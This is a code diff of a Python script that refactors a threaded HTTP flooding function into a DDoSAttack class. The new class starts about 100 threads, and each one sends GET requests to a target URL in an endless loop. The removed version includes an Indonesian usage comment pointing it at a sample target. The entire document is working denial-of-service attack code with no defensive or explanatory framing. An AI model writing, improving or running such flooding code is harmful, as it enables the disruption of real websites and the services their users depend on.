@@ -1,22 +1,22 @@
 import threading
 import requests
 
-def ddos_attack(url, num_requests):
-    def attack():
-        try:
-            response = requests.get(url)
-            print(f"Request sent, status code: {response.status_code}")
-        except requests.exceptions.RequestException as e:
-            print(f"Request failed: {e}")
-    
-    threads = []
-    for _ in range(num_requests):
-        t = threading.Thread(target=attack)
-        threads.append(t)
-        t.start()
+class DDoSAttack:
+    def __init__(self, target_url, threads=100):
+        self.target_url = target_url
+        self.threads = threads
 
-    for t in threads:
-        t.join()
+    def attack(self):
+        def send_request():
+            try:
+                while True:
+                    response = requests.get(self.target_url)
+                    if response.status_code == 200:
+                        print(f"Sent request to {self.target_url}")
+                    else:
+                        print(f"Error in response from {self.target_url}")
+            except requests.RequestException as e:
+                print(f"Error during DDoS attack: {e}")
 
-# Contoh penggunaan:
-# ddos_attack("http://target.com", 1000)
+        for _ in range(self.threads):
+            threading.Thread(target=send_request).start()
